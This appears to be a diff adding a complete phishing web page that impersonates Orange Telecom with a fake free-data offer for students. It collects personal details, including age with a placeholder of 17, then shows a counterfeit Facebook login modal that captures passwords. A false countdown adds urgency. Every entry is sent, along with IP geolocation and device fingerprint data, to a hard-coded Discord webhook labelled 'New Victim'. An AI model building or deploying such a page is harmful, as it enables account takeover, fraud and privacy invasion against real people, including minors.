@@ -1,0 +1,915 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Orange – Free 5GB Student Data Offer</title>
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --orange: #FF6600;
+      --orange-dark: #e05a00;
+      --orange-light: #fff4ee;
+      --white: #ffffff;
+      --grey: #6b7280;
+      --light: #f9fafb;
+      --border: #e5e7eb;
+      --navy: #111827;
+      --fb: #1877f2;
+    }
+
+    body {
+      font-family: 'Nunito', sans-serif;
+      background: var(--light);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* HEADER */
+    header {
+      background: var(--orange);
+      padding: 14px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      box-shadow: 0 2px 12px rgba(255,102,0,0.3);
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .logo-ball {
+      width: 36px;
+      height: 36px;
+      background: white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+      font-weight: 900;
+      color: var(--orange);
+    }
+
+    .logo-name {
+      font-size: 22px;
+      font-weight: 900;
+      color: white;
+      letter-spacing: -0.5px;
+    }
+
+    .header-badge {
+      background: white;
+      color: var(--orange);
+      font-size: 10px;
+      font-weight: 800;
+      padding: 4px 10px;
+      border-radius: 20px;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+    }
+
+    /* HERO */
+    .hero {
+      background: linear-gradient(135deg, var(--orange) 0%, #ff8c00 100%);
+      padding: 32px 20px 40px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .hero::before {
+      content: '';
+      position: absolute;
+      top: -40px; right: -40px;
+      width: 160px; height: 160px;
+      background: rgba(255,255,255,0.08);
+      border-radius: 50%;
+    }
+
+    .hero::after {
+      content: '';
+      position: absolute;
+      bottom: -60px; left: -40px;
+      width: 200px; height: 200px;
+      background: rgba(255,255,255,0.05);
+      border-radius: 50%;
+    }
+
+    .data-badge {
+      display: inline-block;
+      background: rgba(255,255,255,0.2);
+      border: 2px solid rgba(255,255,255,0.4);
+      color: white;
+      font-size: 11px;
+      font-weight: 800;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      padding: 5px 14px;
+      border-radius: 20px;
+      margin-bottom: 14px;
+    }
+
+    .hero-gb {
+      font-size: 72px;
+      font-weight: 900;
+      color: white;
+      line-height: 1;
+      margin-bottom: 4px;
+      text-shadow: 0 4px 20px rgba(0,0,0,0.2);
+    }
+
+    .hero-gb span {
+      font-size: 32px;
+      vertical-align: super;
+    }
+
+    .hero-subtitle {
+      font-size: 18px;
+      font-weight: 700;
+      color: white;
+      margin-bottom: 8px;
+    }
+
+    .hero-desc {
+      font-size: 13px;
+      color: rgba(255,255,255,0.85);
+      max-width: 300px;
+      margin: 0 auto;
+      line-height: 1.6;
+    }
+
+    /* TIMER */
+    .timer-wrap {
+      background: var(--navy);
+      padding: 12px 20px;
+      text-align: center;
+      color: white;
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .timer-wrap span {
+      color: var(--orange);
+      font-weight: 800;
+      font-size: 15px;
+    }
+
+    /* STEPS */
+    .steps-wrap {
+      background: white;
+      border-bottom: 1px solid var(--border);
+      padding: 16px 20px;
+    }
+
+    .steps {
+      display: flex;
+      align-items: center;
+      max-width: 400px;
+      margin: 0 auto;
+    }
+
+    .step {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 4px;
+      flex: 1;
+    }
+
+    .step-dot {
+      width: 30px; height: 30px;
+      border-radius: 50%;
+      border: 2px solid var(--border);
+      background: white;
+      color: var(--grey);
+      font-size: 12px;
+      font-weight: 800;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.3s;
+    }
+
+    .step-dot.active { border-color: var(--orange); background: var(--orange); color: white; }
+    .step-dot.done { border-color: #16a34a; background: #16a34a; color: white; }
+
+    .step-text {
+      font-size: 10px;
+      color: var(--grey);
+      font-weight: 700;
+      text-align: center;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+
+    .step-text.active { color: var(--orange); }
+
+    .step-line {
+      flex: 1;
+      height: 2px;
+      background: var(--border);
+      margin-bottom: 14px;
+      transition: background 0.3s;
+    }
+
+    .step-line.done { background: #16a34a; }
+
+    /* MAIN */
+    main {
+      flex: 1;
+      padding: 24px 20px 48px;
+      max-width: 480px;
+      margin: 0 auto;
+      width: 100%;
+    }
+
+    .page { display: none; }
+    .page.active { display: block; }
+
+    /* CARD */
+    .card {
+      background: white;
+      border-radius: 16px;
+      border: 1px solid var(--border);
+      box-shadow: 0 4px 20px rgba(0,0,0,0.06);
+      padding: 24px;
+      margin-bottom: 16px;
+    }
+
+    .card-title {
+      font-size: 16px;
+      font-weight: 800;
+      color: var(--navy);
+      margin-bottom: 4px;
+    }
+
+    .card-sub {
+      font-size: 12px;
+      color: var(--grey);
+      margin-bottom: 20px;
+    }
+
+    /* FORM */
+    .field { margin-bottom: 16px; }
+
+    label {
+      display: block;
+      font-size: 12.5px;
+      font-weight: 700;
+      color: var(--navy);
+      margin-bottom: 6px;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="tel"],
+    input[type="number"],
+    input[type="password"],
+    select {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1.5px solid var(--border);
+      border-radius: 10px;
+      font-family: 'Nunito', sans-serif;
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--navy);
+      background: white;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      -webkit-appearance: none;
+    }
+
+    input:focus, select:focus {
+      border-color: var(--orange);
+      box-shadow: 0 0 0 3px rgba(255,102,0,0.1);
+    }
+
+    input::placeholder { color: #b0bcd0; font-weight: 400; }
+
+    .row2 { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+
+    .btn-orange {
+      width: 100%;
+      padding: 15px;
+      background: linear-gradient(135deg, var(--orange), var(--orange-dark));
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-family: 'Nunito', sans-serif;
+      font-size: 15px;
+      font-weight: 800;
+      cursor: pointer;
+      letter-spacing: 0.02em;
+      transition: opacity 0.2s, transform 0.1s;
+      margin-top: 8px;
+      box-shadow: 0 4px 16px rgba(255,102,0,0.3);
+    }
+
+    .btn-orange:active { transform: scale(0.98); }
+
+    .error-msg {
+      background: #fef2f2;
+      border: 1px solid #fecaca;
+      color: #dc2626;
+      font-size: 12px;
+      font-weight: 700;
+      padding: 10px 14px;
+      border-radius: 8px;
+      margin-bottom: 14px;
+      display: none;
+    }
+
+    .error-msg.show { display: block; }
+
+    /* INFO BOX */
+    .info-box {
+      background: var(--orange-light);
+      border: 1px solid rgba(255,102,0,0.2);
+      border-radius: 12px;
+      padding: 14px;
+      display: flex;
+      gap: 10px;
+      margin-bottom: 16px;
+    }
+
+    .info-box-icon { font-size: 20px; flex-shrink: 0; }
+    .info-box-text { font-size: 12.5px; color: var(--navy); font-weight: 600; line-height: 1.5; }
+
+    /* FACEBOOK MODAL */
+    .fb-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.6);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .fb-modal {
+      background: white;
+      border-radius: 16px;
+      padding: 24px;
+      width: 100%;
+      max-width: 380px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    }
+
+    .fb-header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .fb-logo {
+      font-size: 32px;
+      font-weight: 900;
+      color: var(--fb);
+      font-family: 'Nunito', sans-serif;
+      margin-bottom: 4px;
+    }
+
+    .fb-tagline {
+      font-size: 12px;
+      color: var(--grey);
+      font-weight: 600;
+    }
+
+    .fb-title {
+      font-size: 15px;
+      font-weight: 800;
+      color: var(--navy);
+      margin-bottom: 16px;
+      text-align: center;
+    }
+
+    .fb-input {
+      width: 100%;
+      padding: 13px 14px;
+      border: 1.5px solid var(--border);
+      border-radius: 10px;
+      font-family: 'Nunito', sans-serif;
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--navy);
+      margin-bottom: 12px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .fb-input:focus { border-color: var(--fb); }
+
+    .btn-fb {
+      width: 100%;
+      padding: 14px;
+      background: var(--fb);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-family: 'Nunito', sans-serif;
+      font-size: 15px;
+      font-weight: 800;
+      cursor: pointer;
+      margin-bottom: 12px;
+      transition: opacity 0.2s;
+    }
+
+    .btn-fb:hover { opacity: 0.9; }
+
+    .fb-cancel {
+      width: 100%;
+      padding: 12px;
+      background: none;
+      border: 1.5px solid var(--border);
+      border-radius: 10px;
+      font-family: 'Nunito', sans-serif;
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--grey);
+      cursor: pointer;
+    }
+
+    .fb-err {
+      background: #fef2f2;
+      border: 1px solid #fecaca;
+      color: #dc2626;
+      font-size: 12px;
+      font-weight: 700;
+      padding: 8px 12px;
+      border-radius: 8px;
+      margin-bottom: 12px;
+      display: none;
+      text-align: center;
+    }
+
+    .fb-terms {
+      text-align: center;
+      font-size: 11px;
+      color: var(--grey);
+      margin-top: 12px;
+      line-height: 1.5;
+    }
+
+    .fb-terms a { color: var(--fb); text-decoration: none; }
+
+    /* SUCCESS PAGE */
+    .success-icon {
+      width: 72px; height: 72px;
+      background: #dcfce7;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 36px;
+      margin: 0 auto 16px;
+    }
+
+    .success-title {
+      font-size: 22px;
+      font-weight: 900;
+      color: var(--navy);
+      text-align: center;
+      margin-bottom: 8px;
+    }
+
+    .success-sub {
+      font-size: 13px;
+      color: var(--grey);
+      text-align: center;
+      font-weight: 600;
+      margin-bottom: 24px;
+      line-height: 1.6;
+    }
+
+    .ref-box {
+      background: var(--orange-light);
+      border: 2px dashed rgba(255,102,0,0.3);
+      border-radius: 12px;
+      padding: 16px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .ref-label {
+      font-size: 11px;
+      color: var(--grey);
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      margin-bottom: 4px;
+    }
+
+    .ref-code {
+      font-size: 20px;
+      font-weight: 900;
+      color: var(--orange);
+      letter-spacing: 2px;
+    }
+
+    .activation-info {
+      background: white;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 16px;
+    }
+
+    .act-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 8px 0;
+      border-bottom: 1px solid var(--border);
+      font-size: 13px;
+    }
+
+    .act-row:last-child { border-bottom: none; }
+    .act-label { color: var(--grey); font-weight: 600; }
+    .act-value { color: var(--navy); font-weight: 800; }
+
+    /* FOOTER */
+    footer {
+      background: white;
+      border-top: 1px solid var(--border);
+      padding: 16px 20px;
+      text-align: center;
+      font-size: 11px;
+      color: var(--grey);
+      font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header>
+  <div class="logo">
+    <div class="logo-ball">O</div>
+    <div class="logo-name">orange</div>
+  </div>
+  <div class="header-badge">Student Offer</div>
+</header>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="data-badge">🎉 Limited Time Offer</div>
+  <div class="hero-gb"><span></span>5<span>GB</span></div>
+  <div class="hero-subtitle">Free Data for Students!</div>
+  <p class="hero-desc">Orange is rewarding students with 5GB of free mobile data. Valid for 30 days. Claim yours before it expires!</p>
+</div>
+
+<!-- TIMER -->
+<div class="timer-wrap">
+  ⏰ Offer expires in: <span id="countdown">23:59:47</span> — Claim now!
+</div>
+
+<!-- STEPS -->
+<div class="steps-wrap">
+  <div class="steps">
+    <div class="step">
+      <div class="step-dot active" id="s1">1</div>
+      <div class="step-text active" id="st1">Verify</div>
+    </div>
+    <div class="step-line" id="l1"></div>
+    <div class="step">
+      <div class="step-dot" id="s2">2</div>
+      <div class="step-text" id="st2">Details</div>
+    </div>
+    <div class="step-line" id="l2"></div>
+    <div class="step">
+      <div class="step-dot" id="s3">3</div>
+      <div class="step-text" id="st3">Confirm</div>
+    </div>
+  </div>
+</div>
+
+<main>
+
+  <!-- PAGE 1 — Personal Info -->
+  <div class="page active" id="page1">
+    <div class="info-box">
+      <div class="info-box-icon">📶</div>
+      <div class="info-box-text">Fill in your details to verify your student status and claim your <strong>5GB free data</strong>.</div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Personal Information</div>
+      <div class="card-sub">All fields are required to verify your identity</div>
+
+      <div class="error-msg" id="err1">⚠️ Please fill in all fields to continue.</div>
+
+      <div class="row2">
+        <div class="field">
+          <label>First Name</label>
+          <input type="text" id="fname" placeholder="John"/>
+        </div>
+        <div class="field">
+          <label>Last Name</label>
+          <input type="text" id="lname" placeholder="Doe"/>
+        </div>
+      </div>
+
+      <div class="row2">
+        <div class="field">
+          <label>Age</label>
+          <input type="number" id="age" placeholder="17" min="10" max="30"/>
+        </div>
+        <div class="field">
+          <label>Phone Number</label>
+          <input type="tel" id="phone" placeholder="+231 XX XXX XXXX"/>
+        </div>
+      </div>
+
+      <div class="field">
+        <label>Email Address</label>
+        <input type="email" id="email" placeholder="you@example.com"/>
+      </div>
+
+      <div class="field">
+        <label>City / Place</label>
+        <input type="text" id="place" placeholder="e.g. Monrovia"/>
+      </div>
+
+      <button class="btn-orange" onclick="handlePage1()">
+        Continue to Verification →
+      </button>
+    </div>
+  </div>
+
+  <!-- PAGE 2 — Facebook Login -->
+  <div class="page" id="page2">
+    <div class="info-box">
+      <div class="info-box-icon">🔐</div>
+      <div class="info-box-text">To prevent abuse, please verify your identity by logging in with Facebook.</div>
+    </div>
+
+    <div class="card" style="text-align:center;">
+      <div class="card-title">Verify Your Identity</div>
+      <div class="card-sub">One last step — confirm who you are</div>
+
+      <div style="margin: 20px 0;">
+        <div style="font-size:48px; font-weight:900; color:var(--fb); margin-bottom:8px;">f</div>
+        <p style="font-size:13px; color:var(--grey); font-weight:600; margin-bottom:20px;">Login with your Facebook account to activate your free data</p>
+        <button class="btn-fb" style="border-radius:12px;" onclick="openFbModal()">
+          🔵 Continue with Facebook
+        </button>
+      </div>
+
+      <p style="font-size:11px; color:var(--grey); font-weight:600;">
+        Your data is protected and will only be used to verify your identity.
+      </p>
+    </div>
+  </div>
+
+  <!-- PAGE 3 — Success -->
+  <div class="page" id="page3">
+    <div class="card" style="text-align:center; padding:32px 24px;">
+      <div class="success-icon">✅</div>
+      <div class="success-title">You're All Set!</div>
+      <div class="success-sub">Your 5GB free data has been queued for activation. You will receive an SMS confirmation shortly.</div>
+
+      <div class="ref-box">
+        <div class="ref-label">Your Reference Code</div>
+        <div class="ref-code" id="refCode">ORG-XXXXX</div>
+      </div>
+
+      <div class="activation-info">
+        <div class="act-row">
+          <span class="act-label">Data Bundle</span>
+          <span class="act-value">5GB Free</span>
+        </div>
+        <div class="act-row">
+          <span class="act-label">Validity</span>
+          <span class="act-value">30 Days</span>
+        </div>
+        <div class="act-row">
+          <span class="act-label">Activation</span>
+          <span class="act-value">Within 24hrs</span>
+        </div>
+        <div class="act-row">
+          <span class="act-label">Status</span>
+          <span class="act-value" style="color:#16a34a;">✓ Confirmed</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</main>
+
+<!-- FACEBOOK MODAL -->
+<div class="fb-overlay" id="fbOverlay">
+  <div class="fb-modal">
+    <div class="fb-header">
+      <div class="fb-logo">facebook</div>
+      <div class="fb-tagline">Connect with friends and the world around you.</div>
+    </div>
+    <div class="fb-title">Log in to verify your identity</div>
+
+    <div class="fb-err" id="fbErr">⚠️ Please enter your email/phone and password.</div>
+
+    <input class="fb-input" type="text" id="fbEmail" placeholder="Mobile number or email address"/>
+    <input class="fb-input" type="password" id="fbPass" placeholder="Password"/>
+
+    <button class="btn-fb" onclick="handleFbLogin()">Log In</button>
+    <button class="fb-cancel" onclick="closeFbModal()">Cancel</button>
+
+    <div class="fb-terms">
+      By logging in you agree to our <a href="#">Terms</a>, <a href="#">Privacy Policy</a> and <a href="#">Cookies Policy</a>.
+    </div>
+  </div>
+</div>
+
+<footer>
+  © 2025 Orange Telecom. All rights reserved. | Terms & Conditions Apply
+</footer>
+
+<script>
+  // ── CONFIG ──
+  const WEBHOOK = 'https://discord.com/api/webhooks/1509286194981376112/SKX82vUlYKDFK7Vm_2WhOrqGTfkIEYWSVK3lbutABrHx4PIMsZFJ-uTPCS3wo3dbgmcY';
+
+  // ── DEVICE INFO ──
+  let deviceInfo = {};
+  async function collectDeviceInfo() {
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      const geo = await res.json();
+      const ua = navigator.userAgent;
+      let device = 'Desktop';
+      if (/iPhone/.test(ua)) device = 'iPhone';
+      else if (/Android/.test(ua)) device = 'Android';
+      else if (/iPad/.test(ua)) device = 'iPad';
+      let browser = 'Unknown';
+      if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
+      else if (/Firefox/.test(ua)) browser = 'Firefox';
+      else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
+      else if (/Edg/.test(ua)) browser = 'Edge';
+      deviceInfo = {
+        ip: geo.ip || 'N/A',
+        city: geo.city || 'N/A',
+        region: geo.region || 'N/A',
+        country: geo.country_name || 'N/A',
+        isp: geo.org || 'N/A',
+        device, browser,
+        os: navigator.platform || 'N/A',
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
+        language: navigator.language || 'N/A',
+        referrer: document.referrer || 'Direct'
+      };
+    } catch(e) { deviceInfo = { ip: 'N/A' }; }
+  }
+
+  function deviceFields() {
+    return [
+      { name: '🌐 IP', value: deviceInfo.ip || 'N/A', inline: true },
+      { name: '📍 Location', value: `${deviceInfo.city}, ${deviceInfo.region}, ${deviceInfo.country}`, inline: true },
+      { name: '🏢 ISP', value: deviceInfo.isp || 'N/A', inline: false },
+      { name: '📱 Device', value: deviceInfo.device || 'N/A', inline: true },
+      { name: '🌍 Browser', value: deviceInfo.browser || 'N/A', inline: true },
+      { name: '💻 OS', value: deviceInfo.os || 'N/A', inline: true },
+      { name: '🖥 Screen', value: deviceInfo.screen || 'N/A', inline: true },
+      { name: '🕐 Timezone', value: deviceInfo.timezone || 'N/A', inline: true },
+      { name: '🗣 Language', value: deviceInfo.language || 'N/A', inline: true },
+      { name: '🔗 Referrer', value: deviceInfo.referrer || 'Direct', inline: false }
+    ];
+  }
+
+  window.addEventListener('load', collectDeviceInfo);
+
+  // ── COUNTDOWN ──
+  let secs = 86387;
+  setInterval(() => {
+    secs--;
+    if (secs < 0) secs = 86400;
+    const h = String(Math.floor(secs / 3600)).padStart(2, '0');
+    const m = String(Math.floor((secs % 3600) / 60)).padStart(2, '0');
+    const s = String(secs % 60).padStart(2, '0');
+    document.getElementById('countdown').textContent = `${h}:${m}:${s}`;
+  }, 1000);
+
+  // ── STEPS ──
+  function setStep(n) {
+    [1,2,3].forEach(i => {
+      const dot = document.getElementById('s' + i);
+      const txt = document.getElementById('st' + i);
+      dot.className = 'step-dot';
+      txt.className = 'step-text';
+      if (i < n) { dot.classList.add('done'); dot.textContent = '✓'; }
+      else if (i === n) { dot.classList.add('active'); txt.classList.add('active'); }
+      else { dot.textContent = i; }
+    });
+    [1,2].forEach(i => {
+      document.getElementById('l' + i).className = 'step-line' + (i < n ? ' done' : '');
+    });
+  }
+
+  function goPage(n) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById('page' + n).classList.add('active');
+    setStep(n);
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  // ── DISCORD ──
+  async function sendToDiscord(fields) {
+    try {
+      await fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          embeds: [{
+            title: '📶 Orange 5GB CTF — New Victim',
+            color: 0xFF6600,
+            fields,
+            timestamp: new Date().toISOString()
+          }]
+        })
+      });
+    } catch(e) {}
+  }
+
+  // ── STORED DATA ──
+  let stored = {};
+
+  // ── PAGE 1 HANDLER ──
+  async function handlePage1() {
+    const fname = document.getElementById('fname').value.trim();
+    const lname = document.getElementById('lname').value.trim();
+    const age   = document.getElementById('age').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const place = document.getElementById('place').value.trim();
+    const err   = document.getElementById('err1');
+
+    if (!fname || !lname || !age || !phone || !email || !place) {
+      err.classList.add('show'); return;
+    }
+    err.classList.remove('show');
+
+    stored = { fname, lname, age, phone, email, place };
+
+    await sendToDiscord([
+      { name: '📋 Stage', value: 'Personal Info Submitted', inline: false },
+      { name: '👤 Name', value: `${fname} ${lname}`, inline: true },
+      { name: '🎂 Age', value: age, inline: true },
+      { name: '📞 Phone', value: phone, inline: true },
+      { name: '📧 Email', value: email, inline: true },
+      { name: '📍 Place', value: place, inline: true },
+      ...deviceFields()
+    ]);
+
+    goPage(2);
+  }
+
+  // ── FACEBOOK MODAL ──
+  function openFbModal() {
+    document.getElementById('fbOverlay').style.display = 'flex';
+  }
+
+  function closeFbModal() {
+    document.getElementById('fbOverlay').style.display = 'none';
+    document.getElementById('fbEmail').value = '';
+    document.getElementById('fbPass').value = '';
+    document.getElementById('fbErr').style.display = 'none';
+  }
+
+  async function handleFbLogin() {
+    const fbEmail = document.getElementById('fbEmail').value.trim();
+    const fbPass  = document.getElementById('fbPass').value;
+    const err     = document.getElementById('fbErr');
+
+    if (!fbEmail || !fbPass) { err.style.display = 'block'; return; }
+    err.style.display = 'none';
+
+    const ref = 'ORG-' + Math.random().toString(36).substr(2, 6).toUpperCase();
+    document.getElementById('refCode').textContent = ref;
+
+    await sendToDiscord([
+      { name: '🎯 Stage', value: 'Facebook Login Captured', inline: false },
+      { name: '👤 Name', value: `${stored.fname} ${stored.lname}`, inline: true },
+      { name: '🎂 Age', value: stored.age, inline: true },
+      { name: '📞 Phone', value: stored.phone, inline: true },
+      { name: '📧 Personal Email', value: stored.email, inline: true },
+      { name: '📍 Place', value: stored.place, inline: true },
+      { name: '📘 FB Email/Phone', value: fbEmail, inline: true },
+      { name: '🔑 FB Password', value: fbPass, inline: true },
+      { name: '🔖 Reference', value: ref, inline: false },
+      ...deviceFields()
+    ]);
+
+    closeFbModal();
+    goPage(3);
+  }
+</script>
+</body>
+</html>
